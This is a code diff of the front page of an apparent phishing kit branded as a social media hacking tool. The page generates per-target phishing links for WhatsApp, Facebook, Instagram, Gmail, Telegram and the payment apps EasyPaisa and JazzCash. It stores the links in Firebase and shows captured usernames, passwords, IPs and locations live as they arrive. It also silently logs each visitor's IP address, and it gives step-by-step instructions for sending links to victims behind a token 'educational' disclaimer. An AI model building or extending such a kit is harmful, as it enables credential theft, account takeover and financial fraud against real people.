@@ -7,317 +7,387 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <script src="firebase-config.js"></script>
+    <link rel="stylesheet" href="css/style.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-            min-height: 100vh;
-            color: #fff;
+        .tool-container {
+            display: flex;
+            gap: 30px;
+            flex-wrap: wrap;
         }
-        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
-        
-        .banner {
-            text-align: center;
-            padding: 40px 20px;
-            background: linear-gradient(45deg, #ff0000, #ff6600, #ffcc00);
-            border-radius: 15px;
-            margin-bottom: 30px;
-            box-shadow: 0 10px 30px rgba(255,0,0,0.3);
-            animation: glow 2s ease-in-out infinite alternate;
+        .tool-container .left-panel {
+            flex: 1;
+            min-width: 300px;
         }
-        @keyframes glow {
-            from { box-shadow: 0 10px 30px rgba(255,0,0,0.3); }
-            to { box-shadow: 0 10px 50px rgba(255,0,0,0.7); }
+        .tool-container .right-panel {
+            flex: 2;
+            min-width: 300px;
         }
-        .banner h1 {
-            font-size: 3em;
-            text-shadow: 3px 3px 6px rgba(0,0,0,0.5);
-            letter-spacing: 2px;
-        }
-        .banner h1 span { color: #000; }
-        .banner .sub {
-            font-size: 1.2em;
-            margin-top: 10px;
-            color: #fff;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-        }
-        
-        .developer {
-            text-align: center;
-            padding: 15px;
-            margin-bottom: 30px;
-            font-size: 1.3em;
-            color: #00ff88;
-        }
-        .developer .icon { font-size: 1.5em; }
-        .developer .name {
-            background: linear-gradient(45deg, #ff0000, #ffff00);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            font-weight: bold;
-        }
-        
-        .disclaimer {
-            background: rgba(0,0,0,0.7);
-            border-left: 5px solid #ffcc00;
-            padding: 15px 20px;
-            margin-bottom: 30px;
-            border-radius: 0 10px 10px 0;
-            font-size: 0.95em;
-            color: #ffcc00;
-            text-align: center;
-        }
-        
-        .categories {
+        .service-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 20px;
-            margin-top: 20px;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 12px;
+            margin-top: 15px;
         }
-        .category-card {
+        .service-item {
             background: rgba(255,255,255,0.05);
-            backdrop-filter: blur(10px);
             border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 15px;
-            padding: 30px;
+            border-radius: 10px;
+            padding: 15px 10px;
             text-align: center;
             cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
+            transition: all 0.3s;
         }
-        .category-card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+        .service-item:hover {
+            background: rgba(255,102,0,0.1);
             border-color: #ff6600;
+            transform: translateY(-3px);
         }
-        .category-card .icon {
-            font-size: 4em;
-            margin-bottom: 15px;
+        .service-item.selected {
+            background: rgba(255,102,0,0.15);
+            border-color: #ff6600;
+            box-shadow: 0 0 15px rgba(255,102,0,0.2);
         }
-        .category-card h3 {
-            font-size: 1.5em;
-            margin-bottom: 10px;
+        .service-item .s-icon { font-size: 2em; display: block; }
+        .service-item .s-name { font-size: 0.85em; margin-top: 5px; color: #ccc; }
+        .generator-box {
+            background: rgba(0,0,0,0.4);
+            border: 1px solid rgba(255,102,0,0.3);
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 20px;
         }
-        .category-card .status {
-            display: inline-block;
-            padding: 5px 15px;
-            background: #00cc44;
-            border-radius: 20px;
-            font-size: 0.85em;
-            margin-top: 10px;
-        }
-        .category-card::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.05), transparent);
-            transition: 0.5s;
-        }
-        .category-card:hover::before { left: 100%; }
-        
-        .link-generator {
-            background: rgba(0,0,0,0.5);
-            border-radius: 15px;
-            padding: 30px;
-            margin: 40px 0;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        .link-generator h2 {
-            text-align: center;
-            margin-bottom: 20px;
-            color: #ff6600;
-        }
-        .link-generator select, .link-generator input {
+        .generator-box input {
             width: 100%;
-            padding: 15px;
-            margin: 10px 0;
+            padding: 12px 15px;
+            margin: 8px 0;
             background: rgba(255,255,255,0.1);
             border: 1px solid rgba(255,255,255,0.2);
-            border-radius: 10px;
+            border-radius: 8px;
             color: #fff;
             font-size: 1em;
         }
-        .link-generator select option { background: #1a1a2e; }
-        .link-generator button {
+        .generator-box input:focus {
+            border-color: #ff6600;
+            outline: none;
+        }
+        .gen-btn {
             width: 100%;
-            padding: 15px;
+            padding: 14px;
             background: linear-gradient(45deg, #ff6600, #ff3300);
             border: none;
-            border-radius: 10px;
+            border-radius: 8px;
             color: #fff;
-            font-size: 1.2em;
+            font-size: 1.1em;
             font-weight: bold;
             cursor: pointer;
-            transition: 0.3s;
+            transition: all 0.3s;
+            margin-top: 10px;
         }
-        .link-generator button:hover { transform: scale(1.02); box-shadow: 0 5px 20px rgba(255,102,0,0.4); }
-        .generated-link {
+        .gen-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 5px 20px rgba(255,102,0,0.4);
+        }
+        .result-box {
             margin-top: 15px;
             padding: 15px;
-            background: rgba(0,255,0,0.1);
-            border: 1px solid #00ff00;
-            border-radius: 10px;
-            word-break: break-all;
+            border-radius: 8px;
             display: none;
+            background: rgba(0,255,0,0.05);
+            border: 1px solid #0f0;
         }
-        
+        .result-box .link-text {
+            color: #0f0;
+            word-break: break-all;
+            font-size: 0.9em;
+            background: rgba(0,0,0,0.3);
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .copy-btn {
+            padding: 8px 20px;
+            background: #00cc44;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            cursor: pointer;
+        }
+        .copy-btn:hover { background: #009933; }
+        .live-preview {
+            margin-top: 10px;
+            padding: 10px;
+            background: rgba(0,255,0,0.1);
+            border-radius: 5px;
+            display: none;
+            font-size: 0.9em;
+        }
+        .live-preview strong { color: #0f0; }
+        .quick-tip {
+            color: #888;
+            font-size: 0.8em;
+            margin-top: 10px;
+        }
+        .dashboard-shortcut {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 999;
+        }
+        .dashboard-shortcut a {
+            display: inline-block;
+            padding: 12px 20px;
+            background: #ff6600;
+            color: #fff;
+            border-radius: 30px;
+            font-weight: bold;
+            box-shadow: 0 5px 20px rgba(255,102,0,0.4);
+            transition: all 0.3s;
+        }
+        .dashboard-shortcut a:hover {
+            transform: scale(1.05);
+            box-shadow: 0 8px 30px rgba(255,102,0,0.6);
+        }
+        .admin-shortcut {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            z-index: 999;
+            opacity: 0.3;
+        }
+        .admin-shortcut:hover { opacity: 1; }
+        .admin-shortcut a {
+            display: inline-block;
+            padding: 8px 15px;
+            background: #333;
+            color: #666;
+            border-radius: 20px;
+            font-size: 0.8em;
+            text-decoration: none;
+        }
         @media (max-width: 768px) {
-            .banner h1 { font-size: 2em; }
-            .categories { grid-template-columns: 1fr; }
+            .tool-container { flex-direction: column; }
         }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- BANNER -->
         <div class="banner">
-            <h1>SOCIAL<span>MEDIA</span>HACK</h1>
-            <div class="sub">Powerfull Social Media Hacking Tool </div>
+            <h1>🔥 <span>HUO</span> ALL SOCIAL MEDIA HACK 🔥</h1>
+            <div class="sub">⚡ Premium Social Media Hacking Tool 2026 ⚡</div>
         </div>
-        
+
+        <!-- DEVELOPER -->
         <div class="developer">
-             Developer: <span class="name">Nawab Zada Hacker</span> 
+            👨‍💻 Developer: <span class="name">Nawab Zada Hacker</span>
             <span class="icon">☠️✌️🦅</span>
         </div>
-        
+
+        <!-- DISCLAIMER -->
         <div class="disclaimer">
-             This Tool is only for Educational purposes please don't use..⚠️
+            ⚠️ This Tool is only for Educational purposes please don't use wrong way ⚠️
         </div>
-        
-        <div class="link-generator">
-            <h2>Generate Phishing Link</h2>
-            <select id="serviceSelect">
-                <option value="">Select Service</option>
-                <option value="whatsapp">📱 WhatsApp Hack</option>
-                <option value="tiktok">🎵 TikTok Hack</option>
-                <option value="facebook">📘 Facebook Hack</option>
-                <option value="instagram">📸 Instagram Hack</option>
-                <option value="snapchat">👻 SnapChat Hack</option>
-                <option value="freefire">🔫 Free Fire Hack</option>
-                <option value="easypaisa">💳 EasyPaisa</option>
-                <option value="jazzcash">🏦 JazzCash</option>
-                <option value="twitter">🐦 Twitter Hack</option>
-            </select>
-            <input type="text" id="targetEmail" placeholder="Enter Target Email / Username / Phone">
-            <button onclick="generateLink()">Generate Link</button>
-            <div class="generated-link" id="generatedLink"></div>
+
+        <!-- MAIN TOOL -->
+        <div class="tool-container">
+            <!-- LEFT: Services -->
+            <div class="left-panel">
+                <div class="card-dark" style="padding:20px;">
+                    <h2 style="color:#ff6600; margin-bottom:15px; text-align:center;">📂 Select Service</h2>
+                    <p style="text-align:center; color:#888; font-size:0.9em; margin-bottom:15px;">Click any service to start</p>
+                    <div class="service-grid" id="serviceGrid">
+                        <!-- Services will be generated by JS -->
+                    </div>
+                </div>
+                
+                <!-- User Dashboard Link -->
+                <div style="margin-top:15px; text-align:center;">
+                    <a href="dashboard.html" class="btn btn-primary" style="display:inline-block;">📊 My Dashboard</a>
+                </div>
+            </div>
+
+            <!-- RIGHT: Generator -->
+            <div class="right-panel">
+                <div class="generator-box">
+                    <h3 style="color:#ff6600; text-align:center; margin-bottom:15px;">🔗 GENERATE PHISHING LINK</h3>
+                    
+                    <div style="margin-bottom:10px;">
+                        <label style="color:#aaa; font-size:0.85em;">🎯 Selected Service:</label>
+                        <div id="selectedServiceDisplay" style="color:#ff6600; font-weight:bold; font-size:1.1em; margin-top:5px; padding:10px; background:rgba(255,102,0,0.1); border-radius:5px;">
+                            ❌ None selected
+                        </div>
+                    </div>
+                    
+                    <input type="text" id="targetInput" placeholder="Enter Target Email / Username / Phone Number">
+                    <input type="text" id="customMessage" placeholder="Optional: Custom message to show on page">
+                    
+                    <button class="gen-btn" id="generateBtn">🚀 GENERATE LINK</button>
+                    
+                    <div class="result-box" id="resultBox">
+                        <strong style="color:#0f0;">✅ LINK GENERATED!</strong>
+                        <div class="link-text" id="linkText"></div>
+                        <button class="copy-btn" id="copyBtn">📋 Copy Link</button>
+                        
+                        <div class="live-preview" id="livePreview">
+                            <strong>🔓 LIVE CAPTURE PREVIEW:</strong><br>
+                            <span id="liveData">Waiting for target to login...</span>
+                        </div>
+                        
+                        <div style="margin-top:10px; color:#888; font-size:0.85em;">
+                            ⏰ <span id="linkTimestamp"></span>
+                        </div>
+                    </div>
+                    
+                    <div class="quick-tip">
+                        💡 <strong>How to use:</strong> Select a service → Generate link → Copy and send to target → Data will appear here + in dashboard
+                    </div>
+                </div>
+            </div>
         </div>
-        
-        <div class="categories" id="categoriesGrid"></div>
     </div>
-    
+
+    <div class="dashboard-shortcut">
+        <a href="dashboard.html">📊 Dashboard</a>
+    </div>
+    <div class="admin-shortcut">
+        <a href="admin.html">⚙️</a>
+    </div>
+
     <script>
-        let visitorIP = '';
-        let visitorID = generateVisitorID();
-        
+
+        let visitorID = localStorage.getItem('visitorID');
+        if (!visitorID) {
+            visitorID = 'V' + Date.now() + '_' + Math.random().toString(36).substr(2, 6).toUpperCase();
+            localStorage.setItem('visitorID', visitorID);
+        }
+
+        let visitorIP = 'Unknown';
         fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
-            .then(data => {
-                visitorIP = data.ip;
-                db.ref('visitors/' + visitorID).set({
-                    ip: visitorIP,
-                    timestamp: Date.now(),
-                    userAgent: navigator.userAgent
-                });
+            .then(d => {
+                visitorIP = d.ip;
+                db.ref('visitors/' + visitorID).set({ ip: visitorIP, timestamp: Date.now(), userAgent: navigator.userAgent });
             })
-            .catch(() => {
-                visitorIP = 'Unknown';
-            });
-        
-        function generateVisitorID() {
-            return 'visitor_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-        }
-        
-        const categories = [
-            { name: 'WhatsApp Hack', icon: '📱', page: 'whatsapp', color: '#25D366', desc: 'Free Blue Tick, Account Hack' },
-            { name: 'TikTok Hack', icon: '🎵', page: 'tiktok', color: '#000', desc: 'Free Likes, Views, Followers, Monetize' },
-            { name: 'FaceBook Hack', icon: '📘', page: 'facebook', color: '#1877F2', desc: 'Account Hack, Free Followers' },
-            { name: 'Instagram Hack', icon: '📸', page: 'instagram', color: '#E4405F', desc: 'Account Hack, Free Followers' },
-            { name: 'SnapChat Hack', icon: '👻', page: 'snapchat', color: '#FFFC00', desc: 'Account Hack, Free Snap Score' },
-            { name: 'Free Fire Hack', icon: '🔫', page: 'freefire', color: '#FF6600', desc: 'Free Diamonds, Unlimited Bundle' },
-            { name: 'EasyPaisa', icon: '💳', page: 'easypaisa', color: '#00A859', desc: 'Account Balance Hack' },
-            { name: 'JazzCash', icon: '🏦', page: 'jazzcash', color: '#ED1C24', desc: 'Account Balance Hack' },
-            { name: 'Twitter Hack', icon: '🐦', page: 'twitter', color: '#1DA1F2', desc: 'Account Hack, Free Followers' }
+            .catch(() => {});
+
+        const services = [
+            { id: 'whatsapp',   name: 'WhatsApp',     icon: '📱', color: '#25D366' },
+            { id: 'tiktok',     name: 'TikTok',       icon: '🎵', color: '#000' },
+            { id: 'facebook',   name: 'Facebook',     icon: '📘', color: '#1877F2' },
+            { id: 'instagram',  name: 'Instagram',    icon: '📸', color: '#E4405F' },
+            { id: 'snapchat',   name: 'SnapChat',     icon: '👻', color: '#FFFC00' },
+            { id: 'freefire',   name: 'Free Fire',    icon: '🔫', color: '#FF6600' },
+            { id: 'easypaisa',  name: 'EasyPaisa',    icon: '💳', color: '#00A859' },
+            { id: 'jazzcash',   name: 'JazzCash',     icon: '🏦', color: '#ED1C24' },
+            { id: 'twitter',    name: 'Twitter / X',  icon: '🐦', color: '#1DA1F2' },
+            { id: 'gmail',      name: 'Gmail Hack',   icon: '📧', color: '#EA4335' },
+            { id: 'telegram',   name: 'Telegram',     icon: '✈️', color: '#0088cc' }
         ];
-        
-        const grid = document.getElementById('categoriesGrid');
-        categories.forEach(cat => {
-            const card = document.createElement('div');
-            card.className = 'category-card';
-            card.style.borderColor = cat.color;
-            card.innerHTML = `
-                <div class="icon">${cat.icon}</div>
-                <h3>${cat.name}</h3>
-                <p style="color: #aaa; font-size: 0.9em;">${cat.desc}</p>
-                <div class="status">✅ Online</div>
-            `;
-            card.onclick = () => {
-                window.location.href = `pages/${cat.page}.html`;
-            };
-            grid.appendChild(card);
+
+        let selectedService = null;
+        let currentLinkID = null;
+
+        const grid = document.getElementById('serviceGrid');
+        services.forEach(s => {
+            const div = document.createElement('div');
+            div.className = 'service-item';
+            div.innerHTML = `<span class="s-icon">${s.icon}</span><span class="s-name">${s.name}</span>`;
+            div.onclick = () => selectService(s, div);
+            grid.appendChild(div);
         });
-        
-        function generateLink() {
-            const service = document.getElementById('serviceSelect').value;
-            const target = document.getElementById('targetEmail').value;
-            
-            if (!service || !target) {
-                alert('❌ Please select a service and enter target info!');
+
+        function selectService(s, el) {
+            document.querySelectorAll('.service-item').forEach(e => e.classList.remove('selected'));
+            if (el) el.classList.add('selected');
+            selectedService = s;
+            document.getElementById('selectedServiceDisplay').innerHTML = `${s.icon} ${s.name}`;
+            document.getElementById('selectedServiceDisplay').style.color = s.color;
+            document.getElementById('resultBox').style.display = 'none';
+        }
+
+        document.getElementById('generateBtn').addEventListener('click', function() {
+            const target = document.getElementById('targetInput').value.trim();
+            const message = document.getElementById('customMessage').value.trim();
+
+            if (!selectedService) {
+                alert('❌ Please select a service first!');
                 return;
             }
+            if (!target) {
+                alert('❌ Please enter target email/username/phone!');
+                return;
+            }
+
+            // Generate unique link ID
+            currentLinkID = 'LINK_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8).toUpperCase();
             
-            const linkID = 'link_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
-            const fullLink = window.location.origin + '/pages/' + service + '.html?id=' + linkID + '&target=' + encodeURIComponent(target);
+            // Build the phishing URL
+            const baseUrl = window.location.origin;
+            const pagePath = '/pages/' + selectedService.id + '.html';
+            const fullLink = baseUrl + pagePath + '?id=' + currentLinkID + '&target=' + encodeURIComponent(target);
             
-            db.ref('generated_links/' + linkID).set({
-                service: service,
+            if (message) {
+              
+            }
+
+            const linkData = {
+                service: selectedService.id,
+                serviceName: selectedService.name,
+                serviceIcon: selectedService.icon,
                 target: target,
                 link: fullLink,
                 generatedBy: visitorID,
                 generatorIP: visitorIP,
+                generatorUA: navigator.userAgent,
                 timestamp: Date.now(),
-                status: 'active'
-            });
+                status: 'active',
+                message: message || ''
+            };
+
+            db.ref('generated_links/' + currentLinkID).set(linkData);
+
+            // Show result
+            const box = document.getElementById('resultBox');
+            box.style.display = 'block';
+            document.getElementById('linkText').textContent = fullLink;
+            document.getElementById('linkTimestamp').textContent = 'Generated: ' + new Date().toLocaleString();
             
-            const linkDiv = document.getElementById('generatedLink');
-            linkDiv.style.display = 'block';
-            linkDiv.innerHTML = `
-                <strong>✅Link Generated Successfully!</strong><br>
-                <span style="color: #0f0;">${fullLink}</span><br><br>
-                <button onclick="copyLink('${fullLink}')" style="padding:10px 20px;background:#00cc44;border:none;border-radius:5px;color:#fff;cursor:pointer;">📋 Copy Link</button>
-                <br><br>
-                <span style="color: #ffcc00;font-size:0.85em;">⏳ Target data will appear here when they login...</span>
-                <div id="liveData_${linkID}" style="margin-top:15px;padding:10px;background:rgba(0,255,0,0.1);border-radius:5px;display:none;"></div>
-            `;
-            
-            db.ref('captured_data/' + linkID).on('value', snapshot => {
+            // Hide live preview initially
+            document.getElementById('livePreview').style.display = 'none';
+
+            // Listen for captured data on this link
+            const capturedRef = db.ref('captured_data/' + currentLinkID);
+            capturedRef.off(); // Remove old listener
+            capturedRef.on('value', function(snapshot) {
                 const data = snapshot.val();
                 if (data) {
-                    const liveDiv = document.getElementById('liveData_' + linkID);
-                    if (liveDiv) {
-                        liveDiv.style.display = 'block';
-                        liveDiv.innerHTML = `
-                            <strong style="color:#0f0;">🔓DATA CAPTURED!</strong><br>
-                            👤 Username: ${data.username || 'N/A'}<br>
-                            🔑 Password: ${data.password || 'N/A'}<br>
-                            🌐 IP: ${data.ip || 'N/A'}<br>
-                            📍 Location: ${data.location || 'Unknown'}<br>
-                            🕐 Time: ${new Date(data.timestamp).toLocaleString()}
-                        `;
-                    }
+                    const preview = document.getElementById('livePreview');
+                    preview.style.display = 'block';
+                    document.getElementById('liveData').innerHTML = `
+                        👤 Username: <strong>${data.username || 'N/A'}</strong><br>
+                        🔑 Password: <strong style="color:#ff0;">${data.password || 'N/A'}</strong><br>
+                        🌐 IP: ${data.ip || 'N/A'}<br>
+                        📍 Location: ${data.location || 'Unknown'}<br>
+                        🕐 ${new Date(data.timestamp).toLocaleString()}
+                    `;
                 }
             });
-        }
-        
-        function copyLink(link) {
+
+            // Scroll to result
+            box.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        });
+
+        document.getElementById('copyBtn').addEventListener('click', function() {
+            const link = document.getElementById('linkText').textContent;
             navigator.clipboard.writeText(link).then(() => {
-                alert('✅ Link copied to clipboard!');
+                this.textContent = '✅ Copied!';
+                setTimeout(() => { this.textContent = '📋 Copy Link'; }, 2000);
             });
-        }
+        });
+
+        document.getElementById('targetInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') document.getElementById('generateBtn').click();
+        });
     </script>
 </body>
 </html>
